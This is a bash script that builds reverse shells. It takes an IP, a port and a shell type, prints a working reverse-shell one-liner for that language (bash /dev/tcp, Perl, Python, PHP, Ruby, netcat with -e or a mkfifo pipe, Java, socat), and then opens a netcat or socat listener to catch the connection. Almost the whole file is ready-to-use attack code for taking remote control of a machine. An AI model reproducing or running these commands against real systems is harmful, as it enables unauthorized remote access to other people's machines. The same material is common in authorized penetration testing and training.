#!/usr/bin/env bash

usage()
{
	echo -e "usage: $0 -i <IP Address> -p <Port> -s <Shell>\n"
       	echo -e "-i\tIP Address"
	echo -e "\t\tex. 192.168.0.10"
	echo -e "-p\tPort number"
	echo -e "\t\tex. 9001"
	echo -e "-s\tShell type"
	echo -e "\t\tbash"
	echo -e "\t\tperl"
	echo -e "\t\tpython"
	echo -e "\t\tphp"
	echo -e "\t\truby"
	echo -e "\t\tnetcat | nc"
	echo -e "\t\tnetcat-old | nc-old (eg. without -e option)"
	echo -e "\t\tjava"
	echo -e "-h\tPrint usage message\n"
}

bash_shell()
{
	echo -e "bash -c 'bash -i >& /dev/tcp/"$ip"/"$port" 0>&1'\n"
	nc -nvlp $port
}

perl_shell()
{
	echo -e "perl -e 'use Socket;\$i="\"$ip\"";\$p="$port";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n"
	nc -nvlp $port
}

python_shell()
{
	echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\"$ip\"","$port"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"
	nc -nvlp $port
}

php_shell()
{
	echo -e "php -r '\$sock=fsockopen("\"$ip\"","$port");exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n"
	nc -nvlp $port
}

ruby_shell()
{
	echo -e "ruby -rsocket -e'f=TCPSocket.open("\"$ip\"","$port").to_i;exec sprintf(\"/bin/sh i <&%d >&%d 2>&%d\",f,f,f)'\n"
	nc -nvlp $port
}

nc_shell()
{
	echo -e "nc -e /bin/sh $ip $port\n"
	nc -nvlp $port
}

oldnc_shell()
{
	echo -e "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f\n"
	nc -nvlp $port
}

java_shell()
{
	echo -e "r = Runtime.getRuntime()"
	echo -e "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$ip/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])"
	echo -e "p.waitFor()\n"
	nc -nvlp $port
}
socat_shell()
{
	echo -e "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ip:$port\n"
	socat file:`tty`,raw,echo=0 tcp-listen:$port

}

while getopts "i:p:s:h" argument; do
case "${argument}" in
	i)
		ip=${OPTARG}
		;;
	p)
		port=${OPTARG}
		;;
	s)
		shell=${OPTARG}
		;;
	h)
		usage
		exit
		;;
esac
done

case "$shell" in
	bash)
		bash_shell
		;;
	perl)
		perl_shell
		;;
	python)
		python_shell
		;;
	php)
		php_shell
		;;
	ruby)
		ruby_shell
		;;
	netcat|nc)
		nc_shell
		;;
	netcat-old|nc-old)
		oldnc_shell
		;;
	java)
		java_shell
		;;
	socat)
		socat_shell
		;;
	*)
		echo ERROR: invalid options 1>&2
		usage
		;;
esac
